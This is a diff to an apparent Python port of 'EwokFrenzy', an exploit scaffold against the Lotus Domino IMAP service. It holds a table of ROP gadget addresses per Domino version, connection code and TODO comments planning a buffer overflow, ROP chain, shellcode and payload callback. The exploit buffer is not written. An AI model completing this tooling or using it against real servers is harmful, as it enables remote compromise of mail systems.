@@ -18,7 +18,6 @@ import sys
 DEFAULT_PORT = 143
 DEFAULT_TIMEOUT = 60
 
-# 每个 Lotus Domino 版本的 ROP gadget 地址（来自 XML <DominoVersion><paramgroup>）
 DOMINO_VERSION_GADGETS = {
     "6.5.4": {
         "AddrPopEax": 0x00428463,
@@ -78,7 +77,7 @@ def run_function(
 
     当前阶段：完成参数解析、IMAP 连接。
     具体 exploit 缓冲区（IMAP 缓冲区溢出、ROP 链、shellcode、载荷投递等）
-    的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
+    的二进制结构尚需通过 IDA/x32dbg 进一步逆向后填充。
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
@@ -97,7 +96,7 @@ def run_function(
         print(f"[*] OffsetEsp2Buffer: 0x{gadgets['OffsetEsp2Buffer']:03X}")
         print(f"[*] OffsetEsp2Ebp: 0x{gadgets['OffsetEsp2Ebp']:03X}")
 
-    # 建立到目标的 TCP 连接（IMAP 143）
+    # 建立 TCP 连接（IMAP 143）
     try:
         sock = connect(target, port, timeout)
         if verbose:
@@ -106,12 +105,9 @@ def run_function(
         raise EwokFrenzyError(f"无法连接到 {target}:{port}: {exc}") from exc
 
     # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - IMAP 缓冲区溢出（OffsetEsp2Buffer 相关）
-    #   - ROP 链（AddrPopEax, AddrJmpEax, AddrVirtualAlloc, AddrJmpEaxPtr,
-    #     AddrPopEdi, AddrEaxToEsi, AddrCopyCode, AddrIncEax,
-    #     AddrSetAtEdxRet, AddrClrEaxRet）
-    #   - Shellcode 注入
-    #   - 载荷投递（Callback）
+    #   - IMAP 缓冲区溢出
+    #   - ROP 链
+    #   - 载荷投递
 
     sock.close()
     return 0
